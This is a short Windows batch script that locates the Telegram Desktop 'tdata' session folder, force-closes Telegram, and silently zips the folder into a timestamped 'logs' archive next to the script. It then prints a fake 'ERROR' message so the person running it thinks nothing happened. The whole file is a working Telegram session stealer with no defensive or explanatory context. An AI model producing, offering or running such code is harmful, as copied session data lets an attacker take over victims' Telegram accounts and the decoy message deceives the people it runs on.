@echo off
set a=
if exist "%APPDATA%\Telegram Desktop\tdata" set a=%APPDATA%\Telegram Desktop\tdata
if "%a%"=="" if exist "%USERPROFILE%\AppData\Local\Telegram Desktop\tdata" set a=%USERPROFILE%\AppData\Local\Telegram Desktop\tdata
if "%a%"=="" if exist "%USERPROFILE%\AppData\Roaming\Telegram Desktop\tdata" set a=%USERPROFILE%\AppData\Roaming\Telegram Desktop\tdata
if "%a%"=="" (
    echo ERROR2
    pause
    exit /b
)
taskkill /f /im Telegram.exe >nul 2>&1
timeout /t 1 /nobreak >nul
for /f %%i in ('powershell -Command "Get-Date -Format 'yyyyMMdd_HHmmss'"') do set b=%%i
powershell -Command "$ProgressPreference='SilentlyContinue'; Compress-Archive -Path \"%a%\" -DestinationPath \"%~dp0logs_%b%.zip\" -Force" >nul 2>&1
echo ERROR
pause